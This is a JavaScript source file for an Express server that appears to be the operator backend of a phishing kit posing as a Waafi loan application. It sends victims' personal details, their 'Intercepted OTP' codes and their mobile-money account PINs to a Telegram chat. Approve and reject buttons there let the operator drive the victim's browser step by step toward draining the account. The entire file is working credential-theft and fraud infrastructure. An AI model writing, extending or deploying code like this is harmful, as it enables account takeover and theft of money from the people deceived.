const express = require('express');
const app = express();
const axios = require('axios');

app.use(express.json());

// Basic health check endpoint for Render monitoring
app.get('/', (req, res) => {
    res.json({ status: "Bot Manager Microservice Operational" });
});

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';
const SERVER_CORE_URL = process.env.SERVER_CORE_URL || 'http://localhost:3000';

// STEP 3 LOG: Plain informational status report. No confirmation buttons.
app.post('/log-step3-data', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`📝 <b>New Application Logged (Auto-Advanced)</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>User:</b> ${session.firstName} ${session.lastName}
• <b>Phone:</b> +252${session.phone}
• <b>Email:</b> ${session.email}
• <b>Amount:</b> $${Number(session.amount).toLocaleString()} (${session.term} Bilood)
• <b>Income:</b> $${Number(session.income).toLocaleString()} (${session.employment})
━━━━━━━━━━━━━━━━━━━━━━━━
Status: <i>User automatically forwarded to Step 4 (OTP input page)...</i>`;

    sendToTelegram(txt, null);
});

// STEP 4 CONTROL: Sends actionable dashboard prompt AFTER user inputs code
app.post('/trigger-step4-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`🔐 <b>Waafi Intercept - Step 4: OTP Verification</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone:</b> +252${session.phone}
• <b>Intercepted OTP:</b> <code>${session.otpToken}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "✅ CONFIRM OTP -> GO PIN", callback_data: `approve_otp:${session.appId}` },
            { text: "❌ WRONG OTP", callback_data: `reject_otp:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// STEP 5 CONTROL: Sends actionable disbursement execution prompt
app.post('/trigger-step5-telegram', async (req, res) => {
    const { session } = req.body;
    res.sendStatus(200);

    const txt = 
`💳 <b>Waafi Intercept - Step 5: Account PIN</b>
🆔 <b>ID:</b> <code>${session.appId}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
• <b>Phone:</b> +252${session.phone}
• <b>Account PIN:</b> <code>${session.pinCode}</code>
━━━━━━━━━━━━━━━━━━━━━━━━`;

    const kb = {
        inline_keyboard: [[
            { text: "💰 APPROVE PIN & DISBURSE", callback_data: `approve_pin:${session.appId}` },
            { text: "❌ WRONG PIN", callback_data: `reject_pin:${session.appId}` }
        ]]
    };

    sendToTelegram(txt, kb);
});

// =========================================================================
// INLINE BUTTON INTERACTIVE WEBHOOK PROCESSOR
// =========================================================================
app.post('/telegram-webhook', async (req, res) => {
    res.sendStatus(200);
    
    const { callback_query } = req.body;
    if (!callback_query || !callback_query.data) return;

    const [actionSignal, targetAppId] = callback_query.data.split(':');
    let logMessage = '';
    let apiRouteSignal = actionSignal;

    if (actionSignal === 'approve_otp') {
        logMessage = "✅ OTP confirmed. Client browser unlocked to collect secure account PIN.";
    } else if (actionSignal === 'reject_otp') {
        apiRouteSignal = 'otp-failed';
        logMessage = "❌ OTP rejected. Client requested to input corrected OTP entry token.";
    } else if (actionSignal === 'approve_pin') {
        logMessage = "💰 SUCCESS! Transaction PIN approved. Funds disbursed and final Success Step shown.";
    } else if (actionSignal === 'reject_pin') {
        apiRouteSignal = 'pin-failed';
        logMessage = "❌ PIN rejected. Client requested to input matching secure access code.";
    }

    // Forward administrative command instantly to server.js core API loop
    try {
        const response = await axios.post(`${SERVER_CORE_URL}/api/admin-action`, {
            actionSignal: apiRouteSignal,
            targetAppId: targetAppId
        });

        if (response.data.success) {
            updateTelegramMessageUI(callback_query.message, logMessage);
        }
    } catch (err) {
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "⚠️ Active application session has expired or closed out.",
                show_alert: true
            });
        } catch (e) {}
    }
});

async function sendToTelegram(text, replyMarkup) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, payload);
    } catch (e) { console.error("Telegram Transmission Error:", e.message); }
}

async function updateTelegramMessageUI(msgObj, statusText) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: msgObj.message_id,
            text: `${msgObj.text}\n\n🤖 <b>System Log:</b>\n<i>${statusText}</i>`,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] } // Wipes buttons cleanly to signify completion
        });
    } catch (e) {}
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`Telegram bot runner engine active on port ${PORT}`));